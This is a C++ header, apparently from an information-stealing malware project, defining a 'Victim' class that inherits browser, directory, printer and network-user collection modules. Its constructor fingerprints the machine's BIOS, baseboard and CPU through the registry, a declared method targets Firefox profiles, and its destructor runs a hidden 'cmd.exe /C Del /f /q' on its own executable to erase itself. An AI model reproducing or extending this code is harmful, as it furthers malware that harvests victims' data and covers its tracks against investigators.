#include "Includes.h"
#include "Registry.h"
#include "Browsers.h"
#include "Directories.h"
#include "Printers.h"
#include "strsafe.h"
#include "NetUsers.h"
#pragma once

class Victim : public Browsers, public Directories, public Printers, public NetUsers {
	//SYSTEM
	std::string systemManu;
	std::string systemProductName;
	std::string systemVersion;
	std::string systemFamily;
	std::string systemSKU;
	//BIOS
	std::string BIOSVersion;
	std::string BIOSVendor;
	std::string BIOSReleaseDate;
	//BaseBoard
	std::string BaseBoardVersion;
	std::string BaseBoardManufacturer;
	std::string BaseBoardProduct;
	Registers::Key CentralProcessorSubKeys;
	std::string CurrentDirectory;

public:
	Victim() {
		systemManu = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer");
		systemProductName = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
		systemVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemVersion");
		systemFamily = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemFamily");
		systemSKU = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemSKU");
		BIOSVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion");
		BIOSVendor = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor");
		BIOSReleaseDate = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate");
		BaseBoardVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardVersion");
		BaseBoardManufacturer = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardManufacturer");
		BaseBoardProduct = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct");
		CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
		CurrentDirectory = GetCommandLineA();
	}
	~Victim() {
		STARTUPINFOA startupInfo = { 0 };
		PROCESS_INFORMATION processInformation = { 0 };
		std::string REMOVECOMMAND = "cmd.exe /C Del /f /q " + this->CurrentDirectory;
		CreateProcessA(NULL, (char*)REMOVECOMMAND.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation);
		CloseHandle(processInformation.hThread);
		CloseHandle(processInformation.hProcess);
	}

	bool GetFirefoxProfiles();
};